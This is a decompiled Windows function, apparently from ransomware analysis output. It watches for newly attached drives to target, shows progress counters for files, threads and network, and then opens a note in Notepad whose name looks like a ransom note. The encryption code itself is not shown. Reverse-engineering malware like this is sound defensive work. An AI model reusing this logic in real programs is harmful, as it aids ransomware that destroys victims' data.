undefined4 UndefinedFunction_00401cd5(HWND param_1,int param_2,int param_3,int param_4)

{
  LPVOID pvVar1;
  
  if (param_2 == 0x110) {
    DAT_00404b28 = param_1;
    _DAT_00404b30 = SetTimer();
    _DAT_00404b34 = SetTimer();
    FUN_00401676();
  }
  else {
    if (param_2 == 0x219) {
      if ((param_3 == 0x8000) && (*(int *)(param_4 + 4) == 2)) {
        pvVar1 = (LPVOID)0x1f;
        if (*(uint *)(param_4 + 0xc) != 0) {
          for (; *(uint *)(param_4 + 0xc) >> (int)pvVar1 == 0; pvVar1 = (LPVOID)((int)pvVar1 + -1))
          {
          }
        }
        FUN_004010a6(pvVar1);
      }
    }
    else {
      if (param_2 == 0x113) {
        DAT_00404b40 = DAT_00404b40 + 1;
        s__files_files/s_s_ftreads_network_00404000._38_4_ = 0x20202020;
        FUN_00401758(DAT_00404b40,s__files_files/s_s_ftreads_network_00404000 + 0x26);
        FUN_00401758(DAT_00404b48,s__files_files/s_s_ftreads_network_00404000);
        s__files_files/s_s_ftreads_network_00404000._19_4_ = 0x20202020;
        FUN_00401758(DAT_00404b48 - _DAT_00404b4c,s__files_files/s_s_ftreads_network_00404000 + 0x13
                    );
        _DAT_00404b4c = DAT_00404b48;
        s__files_files/s_s_ftreads_network_00404000._56_4_ = 0x20202020;
        FUN_00401758(DAT_00404b44,s__files_files/s_s_ftreads_network_00404000 + 0x38);
        FUN_00401e9a();
      }
      else {
        if ((s__files_files/s_s_ftreads_network_00404000[81] == 'n') && (DAT_00404b44 == 0)) {
          Sleep();
          if (_DAT_00404b24 == 0) {
            _DAT_00404b24 = 1;
            ShellExecuteA((HWND)0x0,&DAT_0040431f,s_c:\Windows\notepad.exe_c:\How_T_00404546,
                          (LPCSTR)0x0,(LPCSTR)0x0,5);
          }
          FUN_00401676();
        }
        else {
          if (param_2 != 0x10) {
            return 0;
          }
          ShowWindow(param_1,0);
        }
      }
    }
  }
  return 1;
}
